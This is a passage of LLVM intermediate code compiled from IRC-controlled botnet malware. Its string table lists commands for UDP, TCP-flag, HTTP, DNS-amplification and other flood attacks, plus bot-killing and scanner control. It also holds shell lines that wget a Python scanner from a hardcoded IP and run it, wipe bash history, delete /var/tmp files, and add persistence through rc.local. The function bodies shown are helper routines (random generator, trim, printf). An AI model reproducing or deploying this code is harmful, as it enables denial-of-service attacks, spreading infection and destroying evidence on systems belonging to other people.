@.str.403 = private unnamed_addr constant [27 x i8] c"Failed opening raw socket.\00", align 1
@.str.404 = private unnamed_addr constant [33 x i8] c"Failed setting raw headers mode.\00", align 1
@.str.405 = private unnamed_addr constant [4 x i8] c"all\00", align 1
@.str.406 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.407 = private unnamed_addr constant [4 x i8] c"syn\00", align 1
@.str.408 = private unnamed_addr constant [4 x i8] c"rst\00", align 1
@.str.409 = private unnamed_addr constant [4 x i8] c"fin\00", align 1
@.str.410 = private unnamed_addr constant [4 x i8] c"ack\00", align 1
@.str.411 = private unnamed_addr constant [4 x i8] c"psh\00", align 1
@.str.412 = private unnamed_addr constant [18 x i8] c"Invalid flag \22%s\22\00", align 1
@sendHTTP.connections = private unnamed_addr constant [3 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.413, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.414, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.415, i32 0, i32 0)], align 16
@.str.416 = private unnamed_addr constant [64 x i8] c"%s %s HTTP/1.1\0D\0AConnection: %s\0D\0AAccept: */*\0D\0AUser-Agent: %s\0D\0A\0D\0A\00", align 1
@.str.413 = private unnamed_addr constant [6 x i8] c"close\00", align 1
@.str.414 = private unnamed_addr constant [11 x i8] c"keep-alive\00", align 1
@.str.415 = private unnamed_addr constant [7 x i8] c"accept\00", align 1
@.str.417 = private unnamed_addr constant [2 x i8] c".\00", align 1
@.str.418 = private unnamed_addr constant [10 x i8] c"./DNS.txt\00", align 1
@.str.419 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.420 = private unnamed_addr constant [12 x i8] c"irctc.co.in\00", align 1
@.str.421 = private unnamed_addr constant [10 x i8] c"pkill -9 \00", align 1
@.str.422 = private unnamed_addr constant [20 x i8] c"||busybox pkill -9 \00", align 1
@.str.423 = private unnamed_addr constant [22 x i8] c"history -c;history -w\00", align 1
@.str.424 = private unnamed_addr constant [30 x i8] c"cd /root;rm -rf .bash_history\00", align 1
@.str.425 = private unnamed_addr constant [21 x i8] c"cd /var/tmp; rm -f *\00", align 1
@.str.426 = private unnamed_addr constant [4 x i8] c"%d\0A\00", align 1
@.str.427 = private unnamed_addr constant [8 x i8] c"http://\00", align 1
@.str.428 = private unnamed_addr constant [132 x i8] c"GET /%s HTTP/1.1\0D\0AUser-Agent: Mozilla/4.75 [en] (X11; U; Linux 2.2.16-3 i686)\0D\0AHost: %s:80\0D\0AAccept: */*\0D\0AConnection: Keep-Alive\0D\0A\0D\0A\00", align 1
@.str.429 = private unnamed_addr constant [3 x i8] c"wb\00", align 1
@.str.430 = private unnamed_addr constant [5 x i8] c"\0D\0A\0D\0A\00", align 1
@.str.431 = private unnamed_addr constant [7 x i8] c"PYTHON\00", align 1
@.str.432 = private unnamed_addr constant [8 x i8] c"INSTALL\00", align 1
@.str.433 = private unnamed_addr constant [139 x i8] c"sudo yum install python-paramiko -y;sudo apt-get install python-paramiko -y;sudo mkdir /.tmp/;cd /.tmp;wget http://199.38.245.222/good2.py\00", align 1
@.str.434 = private unnamed_addr constant [26 x i8] c"INSTALLING PYTHON SCANNER\00", align 1
@.str.435 = private unnamed_addr constant [5 x i8] c"bins\00", align 1
@.str.436 = private unnamed_addr constant [56 x i8] c"cd /.tmp;rm -rf *py;wget http://199.38.245.222/good2.py\00", align 1
@.str.437 = private unnamed_addr constant [24 x i8] c"UPDATING PYTHON SCANNER\00", align 1
@.str.438 = private unnamed_addr constant [4 x i8] c"OFF\00", align 1
@.str.439 = private unnamed_addr constant [31 x i8] c"killall -9 python;pkill python\00", align 1
@.str.440 = private unnamed_addr constant [24 x i8] c"STOPPING PYTHON SCANNER\00", align 1
@.str.441 = private unnamed_addr constant [6 x i8] c"START\00", align 1
@.str.442 = private unnamed_addr constant [40 x i8] c"cd /.tmp;python good2.py 1000 LUCKY 1 3\00", align 1
@.str.443 = private unnamed_addr constant [25 x i8] c"STARTING LE HACKA SCANNA\00", align 1
@.str.444 = private unnamed_addr constant [6 x i8] c"PONG!\00", align 1
@.str.445 = private unnamed_addr constant [6 x i8] c"TABLE\00", align 1
@.str.446 = private unnamed_addr constant [23 x i8] c"bins TAKEN SUCCESFULLY\00", align 1
@.str.447 = private unnamed_addr constant [8 x i8] c"SCANNER\00", align 1
@.str.448 = private unnamed_addr constant [17 x i8] c"STOPPING SCANNER\00", align 1
@.str.449 = private unnamed_addr constant [3 x i8] c"ON\00", align 1
@.str.450 = private unnamed_addr constant [26 x i8] c"STARTING SCANNER ON -> %s\00", align 1
@.str.451 = private unnamed_addr constant [8 x i8] c"BOTKILL\00", align 1
@.str.452 = private unnamed_addr constant [29 x i8] c"COMMENCING BOT KILL ON -> %s\00", align 1
@.str.453 = private unnamed_addr constant [12 x i8] c"GETPUBLICIP\00", align 1
@.str.454 = private unnamed_addr constant [17 x i8] c"My Public IP: %s\00", align 1
@.str.455 = private unnamed_addr constant [4 x i8] c"UDP\00", align 1
@.str.456 = private unnamed_addr constant [113 x i8] c"UDP <target> <port (0 for random)> <time> <netmask> <packet size> <poll interval> <sleep check> <sleep time(ms)>\00", align 1
@.str.457 = private unnamed_addr constant [4 x i8] c"TCP\00", align 1
@.str.458 = private unnamed_addr constant [186 x i8] c"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)\00", align 1
@.str.459 = private unnamed_addr constant [5 x i8] c"HTTP\00", align 1
@.str.460 = private unnamed_addr constant [50 x i8] c"HTTP <method> <host> <port> <path> <time> <power>\00", align 1
@.str.461 = private unnamed_addr constant [4 x i8] c"DNS\00", align 1
@.str.462 = private unnamed_addr constant [91 x i8] c"DNS <target IP> <port> <reflection file url> <forks> <pps limiter, -1 for no limit> <time>\00", align 1
@.str.463 = private unnamed_addr constant [58 x i8] c"DNS amplification flooding %s:%s for %d seconds at %d pps\00", align 1
@.str.464 = private unnamed_addr constant [5 x i8] c"HOLD\00", align 1
@.str.465 = private unnamed_addr constant [28 x i8] c"HOLD <target> <port> <time>\00", align 1
@.str.466 = private unnamed_addr constant [5 x i8] c"JUNK\00", align 1
@.str.467 = private unnamed_addr constant [24 x i8] c"JUNK <ip> <port> <time>\00", align 1
@.str.468 = private unnamed_addr constant [4 x i8] c"STD\00", align 1
@.str.469 = private unnamed_addr constant [27 x i8] c"STD <target> <port> <time>\00", align 1
@.str.470 = private unnamed_addr constant [5 x i8] c"KILL\00", align 1
@.str.471 = private unnamed_addr constant [11 x i8] c"Killed %d.\00", align 1
@.str.472 = private unnamed_addr constant [13 x i8] c"None Killed.\00", align 1
@.str.473 = private unnamed_addr constant [22 x i8] c"KILLMYEYEPEEUSINGHOIC\00", align 1
@.str.474 = private unnamed_addr constant [8 x i8] c"8.8.8.8\00", align 1
@.str.475 = private unnamed_addr constant [16 x i8] c"/proc/net/route\00", align 1
@.str.476 = private unnamed_addr constant [11 x i8] c"\0900000000\09\00", align 1
@.str.477 = private unnamed_addr constant [7 x i8] c"x86_64\00", align 1
@.str.478 = private unnamed_addr constant [9 x i8] c"LULZbOT\0A\00", align 1
@.str.479 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.480 = private unnamed_addr constant [19 x i8] c"/etc/rc.d/rc.local\00", align 1
@.str.481 = private unnamed_addr constant [13 x i8] c"/etc/rc.conf\00", align 1
@.str.482 = private unnamed_addr constant [8 x i8] c"\22%s%s\22\0A\00", align 1
@.str.483 = private unnamed_addr constant [2 x i8] c"a\00", align 1
@.str.484 = private unnamed_addr constant [13 x i8] c"fork failed\0A\00", align 1
@.str.485 = private unnamed_addr constant [12 x i8] c"BUILD %s:%s\00", align 1
@.str.486 = private unnamed_addr constant [5 x i8] c"PONG\00", align 1
@.str.487 = private unnamed_addr constant [4 x i8] c"DUP\00", align 1
@.str.488 = private unnamed_addr constant [20 x i8] c"PEACE OUT IMMA DUP\0A\00", align 1
@.str.489 = private unnamed_addr constant [3 x i8] c"SH\00", align 1
@.str.490 = private unnamed_addr constant [8 x i8] c"%s 2>&1\00", align 1
@.str.491 = private unnamed_addr constant [3 x i8] c"%s\00", align 1

; Function Attrs: noinline nounwind uwtable
define void @init_rand(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* %2, align 4
  store i32 %4, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %5 = load i32, i32* %2, align 4
  %6 = add i32 %5, -1640531527
  store i32 %6, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %7 = load i32, i32* %2, align 4
  %8 = add i32 %7, -1640531527
  %9 = add i32 %8, -1640531527
  store i32 %9, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  store i32 3, i32* %3, align 4
  br label %10

; <label>:10:                                     ; preds = %31, %1
  %11 = load i32, i32* %3, align 4
  %12 = icmp slt i32 %11, 4096
  br i1 %12, label %13, label %34

; <label>:13:                                     ; preds = %10
  %14 = load i32, i32* %3, align 4
  %15 = sub nsw i32 %14, 3
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %16
  %18 = load i32, i32* %17, align 4
  %19 = load i32, i32* %3, align 4
  %20 = sub nsw i32 %19, 2
  %21 = sext i32 %20 to i64
  %22 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %21
  %23 = load i32, i32* %22, align 4
  %24 = xor i32 %18, %23
  %25 = xor i32 %24, -1640531527
  %26 = load i32, i32* %3, align 4
  %27 = xor i32 %25, %26
  %28 = load i32, i32* %3, align 4
  %29 = sext i32 %28 to i64
  %30 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %29
  store i32 %27, i32* %30, align 4
  br label %31

; <label>:31:                                     ; preds = %13
  %32 = load i32, i32* %3, align 4
  %33 = add nsw i32 %32, 1
  store i32 %33, i32* %3, align 4
  br label %10

; <label>:34:                                     ; preds = %10
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @rand_cmwc() #0 {
  %1 = alloca i64, align 8
  %2 = alloca i64, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  store i64 18782, i64* %2, align 8
  store i32 -2, i32* %4, align 4
  %5 = load i32, i32* @rand_cmwc.i, align 4
  %6 = add i32 %5, 1
  %7 = and i32 %6, 4095
  store i32 %7, i32* @rand_cmwc.i, align 4
  %8 = load i64, i64* %2, align 8
  %9 = load i32, i32* @rand_cmwc.i, align 4
  %10 = zext i32 %9 to i64
  %11 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %10
  %12 = load i32, i32* %11, align 4
  %13 = zext i32 %12 to i64
  %14 = mul i64 %8, %13
  %15 = load i32, i32* @c, align 4
  %16 = zext i32 %15 to i64
  %17 = add i64 %14, %16
  store i64 %17, i64* %1, align 8
  %18 = load i64, i64* %1, align 8
  %19 = lshr i64 %18, 32
  %20 = trunc i64 %19 to i32
  store i32 %20, i32* @c, align 4
  %21 = load i64, i64* %1, align 8
  %22 = load i32, i32* @c, align 4
  %23 = zext i32 %22 to i64
  %24 = add i64 %21, %23
  %25 = trunc i64 %24 to i32
  store i32 %25, i32* %3, align 4
  %26 = load i32, i32* %3, align 4
  %27 = load i32, i32* @c, align 4
  %28 = icmp ult i32 %26, %27
  br i1 %28, label %29, label %34

; <label>:29:                                     ; preds = %0
  %30 = load i32, i32* %3, align 4
  %31 = add i32 %30, 1
  store i32 %31, i32* %3, align 4
  %32 = load i32, i32* @c, align 4
  %33 = add i32 %32, 1
  store i32 %33, i32* @c, align 4
  br label %34

; <label>:34:                                     ; preds = %29, %0
  %35 = load i32, i32* %4, align 4
  %36 = load i32, i32* %3, align 4
  %37 = sub i32 %35, %36
  %38 = load i32, i32* @rand_cmwc.i, align 4
  %39 = zext i32 %38 to i64
  %40 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %39
  store i32 %37, i32* %40, align 4
  ret i32 %37
}

; Function Attrs: noinline nounwind uwtable
define void @trim(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* %6) #10
  %8 = sub i64 %7, 1
  %9 = trunc i64 %8 to i32
  store i32 %9, i32* %5, align 4
  br label %10

; <label>:10:                                     ; preds = %21, %1
  %11 = load i8*, i8** %2, align 8
  %12 = load i32, i32* %5, align 4
  %13 = sext i32 %12 to i64
  %14 = getelementptr inbounds i8, i8* %11, i64 %13
  %15 = load i8, i8* %14, align 1
  %16 = sext i8 %15 to i64
  %17 = inttoptr i64 %16 to i8*
  %18 = call i32 @strcmp(i8* %17, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.303, i32 0, i32 0)) #10
  %19 = icmp ne i32 %18, 0
  %20 = xor i1 %19, true
  br i1 %20, label %21, label %24

; <label>:21:                                     ; preds = %10
  %22 = load i32, i32* %4, align 4
  %23 = add nsw i32 %22, 1
  store i32 %23, i32* %4, align 4
  br label %10

; <label>:24:                                     ; preds = %10
  br label %25

; <label>:25:                                     ; preds = %42, %24
  %26 = load i32, i32* %5, align 4
  %27 = load i32, i32* %4, align 4
  %28 = icmp sge i32 %26, %27
  br i1 %28, label %29, label %40

; <label>:29:                                     ; preds = %25
  %30 = load i8*, i8** %2, align 8
  %31 = load i32, i32* %5, align 4
  %32 = sext i32 %31 to i64
  %33 = getelementptr inbounds i8, i8* %30, i64 %32
  %34 = load i8, i8* %33, align 1
  %35 = sext i8 %34 to i64
  %36 = inttoptr i64 %35 to i8*
  %37 = call i32 @strcmp(i8* %36, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.303, i32 0, i32 0)) #10
  %38 = icmp ne i32 %37, 0
  %39 = xor i1 %38, true
  br label %40

; <label>:40:                                     ; preds = %29, %25
  %41 = phi i1 [ false, %25 ], [ %39, %29 ]
  br i1 %41, label %42, label %45

; <label>:42:                                     ; preds = %40
  %43 = load i32, i32* %5, align 4
  %44 = add nsw i32 %43, -1
  store i32 %44, i32* %5, align 4
  br label %25

; <label>:45:                                     ; preds = %40
  %46 = load i32, i32* %4, align 4
  store i32 %46, i32* %3, align 4
  br label %47

; <label>:47:                                     ; preds = %63, %45
  %48 = load i32, i32* %3, align 4
  %49 = load i32, i32* %5, align 4
  %50 = icmp sle i32 %48, %49
  br i1 %50, label %51, label %66

; <label>:51:                                     ; preds = %47
  %52 = load i8*, i8** %2, align 8
  %53 = load i32, i32* %3, align 4
  %54 = sext i32 %53 to i64
  %55 = getelementptr inbounds i8, i8* %52, i64 %54
  %56 = load i8, i8* %55, align 1
  %57 = load i8*, i8** %2, align 8
  %58 = load i32, i32* %3, align 4
  %59 = load i32, i32* %4, align 4
  %60 = sub nsw i32 %58, %59
  %61 = sext i32 %60 to i64
  %62 = getelementptr inbounds i8, i8* %57, i64 %61
  store i8 %56, i8* %62, align 1
  br label %63

; <label>:63:                                     ; preds = %51
  %64 = load i32, i32* %3, align 4
  %65 = add nsw i32 %64, 1
  store i32 %65, i32* %3, align 4
  br label %47

; <label>:66:                                     ; preds = %47
  %67 = load i8*, i8** %2, align 8
  %68 = load i32, i32* %3, align 4
  %69 = load i32, i32* %4, align 4
  %70 = sub nsw i32 %68, %69
  %71 = sext i32 %70 to i64
  %72 = getelementptr inbounds i8, i8* %67, i64 %71
  store i8 0, i8* %72, align 1
  ret void
}

; Function Attrs: nounwind readonly
declare i64 @strlen(i8*) #1

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8*, i8*) #1

; Function Attrs: noinline nounwind uwtable
define i32 @zprintf(i8*, ...) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %2, align 8
  %4 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i32 0, i32 0
  %5 = bitcast %struct.__va_list_tag* %4 to i8*
  call void @llvm.va_start(i8* %5)
  %6 = load i8*, i8** %2, align 8
  %7 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i32 0, i32 0
  %8 = call i32 @print(i8** null, i8* %6, %struct.__va_list_tag* %7)
  ret i32 %8
}

; Function Attrs: nounwind
declare void @llvm.va_start(i8*) #2

; Function Attrs: noinline nounwind uwtable
define internal i32 @print(i8**, i8*, %struct.__va_list_tag*) #0 {
  %4 = alloca i8**, align 8
  %5 = alloca i8*, align 8
  %6 = alloca %struct.__va_list_tag*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [2 x i8], align 1
  %11 = alloca i8*, align 8
  store i8** %0, i8*** %4, align 8
  store i8* %1, i8** %5, align 8
  store %struct.__va_list_tag* %2, %struct.__va_list_tag** %6, align 8
  store i32 0, i32* %9, align 4
  br label %12

; <label>:12:                                     ; preds = %283, %3
  %13 = load i8*, i8** %5, align 8
  %14 = load i8, i8* %13, align 1
  %15 = zext i8 %14 to i32
  %16 = icmp ne i32 %15, 0
  br i1 %16, label %17, label %286

; <label>:17:                                     ; preds = %12
  %18 = load i8*, i8** %5, align 8
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 %20, 37
  br i1 %21, label %22, label %274

; <label>:22:                                     ; preds = %17
  %23 = load i8*, i8** %5, align 8
  %24 = getelementptr inbounds i8, i8* %23, i32 1
  store i8* %24, i8** %5, align 8
  store i32 0, i32* %8, align 4
  store i32 0, i32* %7, align 4
  %25 = load i8*, i8** %5, align 8
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = icmp eq i32 %27, 0
  br i1 %28, label %29, label %30

; <label>:29:                                     ; preds = %22
  br label %286

; <label>:30:                                     ; preds = %22
  %31 = load i8*, i8** %5, align 8
  %32 = load i8, i8* %31, align 1
  %33 = zext i8 %32 to i32
  %34 = icmp eq i32 %33, 37
  br i1 %34, label %35, label %36

; <label>:35:                                     ; preds = %30
  br label %275

; <label>:36:                                     ; preds = %30
  %37 = load i8*, i8** %5, align 8
  %38 = load i8, i8* %37, align 1
  %39 = zext i8 %38 to i32
  %40 = icmp eq i32 %39, 45
  br i1 %40, label %41, label %44

; <label>:41:                                     ; preds = %36
  %42 = load i8*, i8** %5, align 8
  %43 = getelementptr inbounds i8, i8* %42, i32 1
  store i8* %43, i8** %5, align 8
  store i32 1, i32* %8, align 4
  br label %44

; <label>:44:                                     ; preds = %41, %36
  br label %45

; <label>:45:                                     ; preds = %50, %44
  %46 = load i8*, i8** %5, align 8
  %47 = load i8, i8* %46, align 1
  %48 = zext i8 %47 to i32
  %49 = icmp eq i32 %48, 48
  br i1 %49, label %50, label %55

; <label>:50:                                     ; preds = %45
  %51 = load i8*, i8** %5, align 8
  %52 = getelementptr inbounds i8, i8* %51, i32 1
  store i8* %52, i8** %5, align 8
  %53 = load i32, i32* %8, align 4
  %54 = or i32 %53, 2
  store i32 %54, i32* %8, align 4
  br label %45

; <label>:55:                                     ; preds = %45
  br label %56

; <label>:56:                                     ; preds = %77, %55
  %57 = load i8*, i8** %5, align 8
  %58 = load i8, i8* %57, align 1
  %59 = zext i8 %58 to i32
  %60 = icmp sge i32 %59, 48
  br i1 %60, label %61, label %66

; <label>:61:                                     ; preds = %56
  %62 = load i8*, i8** %5, align 8
  %63 = load i8, i8* %62, align 1
  %64 = zext i8 %63 to i32
  %65 = icmp sle i32 %64, 57
  br label %66

; <label>:66:                                     ; preds = %61, %56
  %67 = phi i1 [ false, %56 ], [ %65, %61 ]
  br i1 %67, label %68, label %80

; <label>:68:                                     ; preds = %66
  %69 = load i32, i32* %7, align 4
  %70 = mul nsw i32 %69, 10
  store i32 %70, i32* %7, align 4
  %71 = load i8*, i8** %5, align 8
  %72 = load i8, i8* %71, align 1
  %73 = zext i8 %72 to i32
  %74 = sub nsw i32 %73, 48
  %75 = load i32, i32* %7, align 4
  %76 = add nsw i32 %75, %74
  store i32 %76, i32* %7, align 4
  br label %77

; <label>:77:                                     ; preds = %68
  %78 = load i8*, i8** %5, align 8
  %79 = getelementptr inbounds i8, i8* %78, i32 1
  store i8* %79, i8** %5, align 8
  br label %56

; <label>:80:                                     ; preds = %66
  %81 = load i8*, i8** %5, align 8
  %82 = load i8, i8* %81, align 1
  %83 = zext i8 %82 to i32
  %84 = icmp eq i32 %83, 115
  br i1 %84, label %85, label %119

; <label>:85:                                     ; preds = %80
  %86 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %87 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %86, i32 0, i32 0
  %88 = load i32, i32* %87, align 8
  %89 = icmp ule i32 %88, 40
  br i1 %89, label %90, label %96

; <label>:90:                                     ; preds = %85
  %91 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %86, i32 0, i32 3
  %92 = load i8*, i8** %91, align 8
  %93 = getelementptr i8, i8* %92, i32 %88
  %94 = bitcast i8* %93 to i32*
  %95 = add i32 %88, 8
  store i32 %95, i32* %87, align 8
  br label %101

; <label>:96:                                     ; preds = %85
  %97 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %86, i32 0, i32 2
  %98 = load i8*, i8** %97, align 8
  %99 = bitcast i8* %98 to i32*
  %100 = getelementptr i8, i8* %98, i32 8
  store i8* %100, i8** %97, align 8
  br label %101

; <label>:101:                                    ; preds = %96, %90
  %102 = phi i32* [ %94, %90 ], [ %99, %96 ]
  %103 = load i32, i32* %102, align 4
  %104 = sext i32 %103 to i64
  %105 = inttoptr i64 %104 to i8*
  store i8* %105, i8** %11, align 8
  %106 = load i8**, i8*** %4, align 8
  %107 = load i8*, i8** %11, align 8
  %108 = icmp ne i8* %107, null
  br i1 %108, label %109, label %111

; <label>:109:                                    ; preds = %101
  %110 = load i8*, i8** %11, align 8
  br label %112

; <label>:111:                                    ; preds = %101
  br label %112

; <label>:112:                                    ; preds = %111, %109
  %113 = phi i8* [ %110, %109 ], [ getelementptr inbounds ([7 x i8], [7 x i8]* @.str.492, i32 0, i32 0), %111 ]
  %114 = load i32, i32* %7, align 4
  %115 = load i32, i32* %8, align 4
  %116 = call i32 @prints(i8** %106, i8* %113, i32 %114, i32 %115)
  %117 = load i32, i32* %9, align 4
  %118 = add nsw i32 %117, %116
  store i32 %118, i32* %9, align 4
  br label %283

; <label>:119:                                    ; preds = %80
  %120 = load i8*, i8** %5, align 8
  %121 = load i8, i8* %120, align 1
  %122 = zext i8 %121 to i32
  %123 = icmp eq i32 %122, 100
  br i1 %123, label %124, label %149

; <label>:124:                                    ; preds = %119
  %125 = load i8**, i8*** %4, align 8
  %126 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %127 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %126, i32 0, i32 0
  %128 = load i32, i32* %127, align 8
  %129 = icmp ule i32 %128, 40
  br i1 %129, label %130, label %136

; <label>:130:                                    ; preds = %124
  %131 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %126, i32 0, i32 3
  %132 = load i8*, i8** %131, align 8
  %133 = getelementptr i8, i8* %132, i32 %128
  %134 = bitcast i8* %133 to i32*
  %135 = add i32 %128, 8
  store i32 %135, i32* %127, align 8
  br label %141

; <label>:136:                                    ; preds = %124
  %137 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %126, i32 0, i32 2
  %138 = load i8*, i8** %137, align 8
  %139 = bitcast i8* %138 to i32*
  %140 = getelementptr i8, i8* %138, i32 8
  store i8* %140, i8** %137, align 8
  br label %141

; <label>:141:                                    ; preds = %136, %130
  %142 = phi i32* [ %134, %130 ], [ %139, %136 ]
  %143 = load i32, i32* %142, align 4
  %144 = load i32, i32* %7, align 4
  %145 = load i32, i32* %8, align 4
  %146 = call i32 @printi(i8** %125, i32 %143, i32 10, i32 1, i32 %144, i32 %145, i32 97)
  %147 = load i32, i32* %9, align 4
  %148 = add nsw i32 %147, %146
  store i32 %148, i32* %9, align 4
  br label %283

; <label>:149:                                    ; preds = %119
  %150 = load i8*, i8** %5, align 8
  %151 = load i8, i8* %150, align 1
  %152 = zext i8 %151 to i32
  %153 = icmp eq i32 %152, 120
  br i1 %153, label %154, label %179

; <label>:154:                                    ; preds = %149
  %155 = load i8**, i8*** %4, align 8
  %156 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %157 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %156, i32 0, i32 0
  %158 = load i32, i32* %157, align 8
  %159 = icmp ule i32 %158, 40
  br i1 %159, label %160, label %166

; <label>:160:                                    ; preds = %154
  %161 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %156, i32 0, i32 3
  %162 = load i8*, i8** %161, align 8
  %163 = getelementptr i8, i8* %162, i32 %158
  %164 = bitcast i8* %163 to i32*
  %165 = add i32 %158, 8
  store i32 %165, i32* %157, align 8
  br label %171

; <label>:166:                                    ; preds = %154
  %167 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %156, i32 0, i32 2
  %168 = load i8*, i8** %167, align 8
  %169 = bitcast i8* %168 to i32*
  %170 = getelementptr i8, i8* %168, i32 8
  store i8* %170, i8** %167, align 8
  br label %171

; <label>:171:                                    ; preds = %166, %160
  %172 = phi i32* [ %164, %160 ], [ %169, %166 ]
  %173 = load i32, i32* %172, align 4
  %174 = load i32, i32* %7, align 4
  %175 = load i32, i32* %8, align 4
  %176 = call i32 @printi(i8** %155, i32 %173, i32 16, i32 0, i32 %174, i32 %175, i32 97)
  %177 = load i32, i32* %9, align 4
  %178 = add nsw i32 %177, %176
  store i32 %178, i32* %9, align 4
  br label %283

; <label>:179:                                    ; preds = %149
  %180 = load i8*, i8** %5, align 8
  %181 = load i8, i8* %180, align 1
  %182 = zext i8 %181 to i32
  %183 = icmp eq i32 %182, 88
  br i1 %183, label %184, label %209

; <label>:184:                                    ; preds = %179
  %185 = load i8**, i8*** %4, align 8
  %186 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %187 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %186, i32 0, i32 0
  %188 = load i32, i32* %187, align 8
  %189 = icmp ule i32 %188, 40
  br i1 %189, label %190, label %196

; <label>:190:                                    ; preds = %184
  %191 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %186, i32 0, i32 3
  %192 = load i8*, i8** %191, align 8
  %193 = getelementptr i8, i8* %192, i32 %188
  %194 = bitcast i8* %193 to i32*
  %195 = add i32 %188, 8
  store i32 %195, i32* %187, align 8
  br label %201

; <label>:196:                                    ; preds = %184
  %197 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %186, i32 0, i32 2
  %198 = load i8*, i8** %197, align 8
  %199 = bitcast i8* %198 to i32*
  %200 = getelementptr i8, i8* %198, i32 8
  store i8* %200, i8** %197, align 8
  br label %201

; <label>:201:                                    ; preds = %196, %190
  %202 = phi i32* [ %194, %190 ], [ %199, %196 ]
  %203 = load i32, i32* %202, align 4
  %204 = load i32, i32* %7, align 4
  %205 = load i32, i32* %8, align 4
  %206 = call i32 @printi(i8** %185, i32 %203, i32 16, i32 0, i32 %204, i32 %205, i32 65)
  %207 = load i32, i32* %9, align 4
  %208 = add nsw i32 %207, %206
  store i32 %208, i32* %9, align 4
  br label %283

; <label>:209:                                    ; preds = %179
  %210 = load i8*, i8** %5, align 8
  %211 = load i8, i8* %210, align 1
  %212 = zext i8 %211 to i32
  %213 = icmp eq i32 %212, 117
  br i1 %213, label %214, label %239

; <label>:214:                                    ; preds = %209
  %215 = load i8**, i8*** %4, align 8
  %216 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %217 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %216, i32 0, i32 0
  %218 = load i32, i32* %217, align 8
  %219 = icmp ule i32 %218, 40
  br i1 %219, label %220, label %226

; <label>:220:                                    ; preds = %214
  %221 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %216, i32 0, i32 3
  %222 = load i8*, i8** %221, align 8
  %223 = getelementptr i8, i8* %222, i32 %218
  %224 = bitcast i8* %223 to i32*
  %225 = add i32 %218, 8
  store i32 %225, i32* %217, align 8
  br label %231

; <label>:226:                                    ; preds = %214
  %227 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %216, i32 0, i32 2
  %228 = load i8*, i8** %227, align 8
  %229 = bitcast i8* %228 to i32*
  %230 = getelementptr i8, i8* %228, i32 8
  store i8* %230, i8** %227, align 8
  br label %231

; <label>:231:                                    ; preds = %226, %220
  %232 = phi i32* [ %224, %220 ], [ %229, %226 ]
  %233 = load i32, i32* %232, align 4
  %234 = load i32, i32* %7, align 4
  %235 = load i32, i32* %8, align 4
  %236 = call i32 @printi(i8** %215, i32 %233, i32 10, i32 0, i32 %234, i32 %235, i32 97)
  %237 = load i32, i32* %9, align 4
  %238 = add nsw i32 %237, %236
  store i32 %238, i32* %9, align 4
  br label %283

; <label>:239:                                    ; preds = %209
  %240 = load i8*, i8** %5, align 8
  %241 = load i8, i8* %240, align 1
  %242 = zext i8 %241 to i32
  %243 = icmp eq i32 %242, 99
  br i1 %243, label %244, label %273

; <label>:244:                                    ; preds = %239
